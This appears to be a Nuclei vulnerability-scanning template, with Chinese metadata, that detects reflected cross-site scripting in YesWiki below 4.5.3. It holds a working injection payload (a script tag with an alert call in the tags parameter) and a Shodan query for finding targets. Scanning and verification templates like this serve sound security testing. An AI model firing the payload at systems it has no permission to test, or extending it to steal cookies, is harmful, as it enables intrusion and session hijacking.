id: yeswiki-reflected-xss

info:
  name: YesWiki - 跨站脚本漏洞
  author: MuhammadWaseem
  severity: high
  description: YesWiki < 4.5.3 存在多个反射型跨站脚本漏洞。该模板通过构造恶意输入并检查回显特征，验证目标是否会在浏览器上下文中执行任意 JavaScript。
  impact: |
    - 攻击者可在受害者浏览器上下文中执行恶意脚本。
    - 可能导致 Cookie 窃取、会话劫持、页面篡改或钓鱼攻击。
  remediation: |
    - 升级到 YesWiki 4.6.0 或更高版本。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
  reference:
    - https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq
  metadata:
    verified: true
    max-request: 1
    shodan-query: "yeswiki"
  tags: xss,yeswiki,cms

http:
  - method: GET
    path:
      - "{{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "yeswiki-base"
        condition: and

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: status
        status:
          - 200
